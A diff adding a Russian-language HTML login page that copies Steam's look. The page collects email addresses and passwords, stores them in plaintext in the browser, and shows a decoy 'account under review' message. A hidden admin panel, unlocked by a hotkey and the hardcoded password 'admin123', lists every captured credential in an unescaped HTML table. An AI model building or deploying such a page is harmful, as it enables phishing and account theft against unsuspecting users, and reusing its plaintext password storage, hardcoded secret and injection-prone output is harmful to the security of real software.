@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход</title>
+    <style>
+        /* === ОБЩИЕ НАСТРОЙКИ СТРАНИЦЫ === */
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, Helvetica, sans-serif;
+
+            /* Тёмно-синий градиент как у Steam */
+            background: linear-gradient(180deg, #1b2838 0%, #171a21 100%);
+        }
+
+        /* === ЗАГОЛОВОК "Sign in" === */
+        .title {
+            position: absolute;
+            top: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        /* === КАРТОЧКА С ФОРМОЙ === */
+        .login-container {
+            background-color: #171a21;
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: 0 4px 25px rgba(0,0,0,0.6);
+            width: 380px;
+            color: #c7d5e0;
+            border: 1px solid #2a3f5a;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 12px;
+            color: #1999ff;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: bold;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background-color: #32353c;
+            border: none;
+            border-radius: 3px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            background-color: #3b3f47;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #969696;
+        }
+
+        .checkbox-group input {
+            margin-right: 8px;
+            cursor: pointer;
+            accent-color: #1999ff;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(90deg, #06BFFF 0%, #2D73FF 100%);
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: opacity 0.3s;
+        }
+
+        .submit-btn:hover {
+            opacity: 0.9;
+        }
+
+        .help-link {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: #969696;
+            font-size: 13px;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        /* === ВСПЛЫВАЮЩЕЕ ОКНО "СПАСИБО" === */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+        }
+
+        .modal-box {
+            background: #171a21;
+            padding: 30px 40px;
+            border-radius: 4px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.6);
+            color: #c7d5e0;
+            border: 1px solid #2a3f5a;
+            animation: popup 0.3s ease-out;
+        }
+
+        .modal-box h3 {
+            margin-top: 0;
+            color: #06BFFF;
+            font-size: 22px;
+        }
+
+        .modal-box button {
+            margin-top: 15px;
+            padding: 10px 30px;
+            background: linear-gradient(90deg, #06BFFF 0%, #2D73FF 100%);
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        @keyframes popup {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* === АДМИН-ПАНЕЛЬ (скрыта по умолчанию) === */
+        .admin-panel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0e1419;
+            color: #c7d5e0;
+            padding: 40px;
+            box-sizing: border-box;
+            overflow-y: auto;
+            z-index: 9999;
+            display: none;
+        }
+
+        .admin-panel h2 {
+            color: #06BFFF;
+            margin-top: 0;
+        }
+
+        .admin-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .admin-table th {
+            background: #1b2838;
+            color: #1999ff;
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #2a3f5a;
+        }
+
+        .admin-table td {
+            padding: 10px 12px;
+            border-bottom: 1px solid #2a3f5a;
+            color: #c7d5e0;
+            word-break: break-all;
+        }
+
+        .admin-table tr:hover td {
+            background: #1b2838;
+        }
+
+        .admin-buttons {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .admin-btn {
+            padding: 10px 20px;
+            background: #2a3f5a;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .admin-btn:hover {
+            background: #3a5f8a;
+        }
+
+        .admin-btn.danger {
+            background: #8a2a2a;
+        }
+
+        .admin-btn.danger:hover {
+            background: #b03030;
+        }
+
+        .admin-close {
+            position: fixed;
+            top: 20px;
+            right: 30px;
+            background: #8a2a2a;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px;
+            z-index: 10000;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Заголовок сверху -->
+    <div class="title">Sign in</div>
+
+    <!-- Форма входа -->
+    <div class="login-container">
+        <form id="loginForm">
+            <div class="input-group">
+                <label class="input-label" for="email">Введите почту</label>
+                <input type="email" id="email" placeholder="example@mail.ru" required>
+            </div>
+            <div class="input-group">
+                <label class="input-label" for="password">Пароль</label>
+                <input type="password" id="password" required>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="remember">
+                <label for="remember">Запомнить меня</label>
+            </div>
+
+            <button type="submit" class="submit-btn">Войти</button>
+            <a class="help-link">Помощь, я не могу войти</a>
+        </form>
+    </div>
+
+    <!-- Всплывающее окно -->
+    <div class="modal-overlay" id="myModal">
+        <div class="modal-box">
+            <h3>Спасибо!</h3>
+            <p>Ваш аккаунт будет рассмотрен администрацией. Пожалуйста, ожидайте.</p>
+            <button onclick="closeModal()">Ок</button>
+        </div>
+    </div>
+
+    <!-- === АДМИН-ПАНЕЛЬ (скрыта, откроется по паролю) === -->
+    <div class="admin-panel" id="adminPanel">
+        <button class="admin-close" onclick="closeAdmin()">✕ Закрыть</button>
+        <h2>📋 Данные пользователей</h2>
+        <p>Все, кто вводил данные в форму (сохраняется в этом браузере):</p>
+        <div id="adminContent"></div>
+        <div class="admin-buttons">
+            <button class="admin-btn" onclick="refreshAdmin()">🔄 Обновить</button>
+            <button class="admin-btn danger" onclick="clearAll()">🗑 Очистить всё</button>
+        </div>
+    </div>
+
+    <script>
+        /* === РАБОТА С ФОРМОЙ === */
+        const form = document.getElementById('loginForm');
+        const modal = document.getElementById('myModal');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Получаем данные
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Сохраняем в localStorage (это то, что вы называете "куки")
+            const users = JSON.parse(localStorage.getItem('savedUsers') || '[]');
+            users.push({
+                email: email,
+                password: password,
+                date: new Date().toLocaleString('ru-RU')
+            });
+            localStorage.setItem('savedUsers', JSON.stringify(users));
+
+            // Показываем окно "Спасибо"
+            modal.style.display = 'flex';
+
+            // Очищаем форму
+            form.reset();
+        });
+
+        function closeModal() {
+            modal.style.display = 'none';
+        }
+
+        /* === АДМИН-ПАНЕЛЬ === */
+        // Секретный пароль для входа в админку
+        const ADMIN_PASSWORD = "admin123";
+
+        // Открыть админ-панель можно так:
+        // 1. Нажать Ctrl + Shift + A на странице
+        // 2. Или ввести в консоли (F12): openAdmin()
+
+        function openAdmin() {
+            const input = prompt("Введите пароль администратора:");
+            if (input === ADMIN_PASSWORD) {
+                document.getElementById('adminPanel').style.display = 'block';
+                refreshAdmin();
+            } else if (input !== null) {
+                alert("Неверный пароль!");
+            }
+        }
+
+        function closeAdmin() {
+            document.getElementById('adminPanel').style.display = 'none';
+        }
+
+        function refreshAdmin() {
+            const users = JSON.parse(localStorage.getItem('savedUsers') || '[]');
+            const container = document.getElementById('adminContent');
+
+            if (users.length === 0) {
+                container.innerHTML = "<p style='color:#969696;'>Пока никто не вводил данные.</p>";
+                return;
+            }
+
+            let html = '<table class="admin-table">';
+            html += '<tr><th>#</th><th>Почта</th><th>Пароль</th><th>Дата</th></tr>';
+            users.forEach((user, index) => {
+                html += `<tr>
+                    <td>${index + 1}</td>
+                    <td>${user.email}</td>
+                    <td>${user.password}</td>
+                    <td>${user.date}</td>
+                </tr>`;
+            });
+            html += '</table>';
+            container.innerHTML = html;
+        }
+
+        function clearAll() {
+            if (confirm("Удалить все сохранённые данные?")) {
+                localStorage.removeItem('savedUsers');
+                refreshAdmin();
+            }
+        }
+
+        // Горячая клавиша Ctrl + Shift + A для открытия админки
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
+                openAdmin();
+            }
+        });
+    </script>
+
+</body>
+</html>
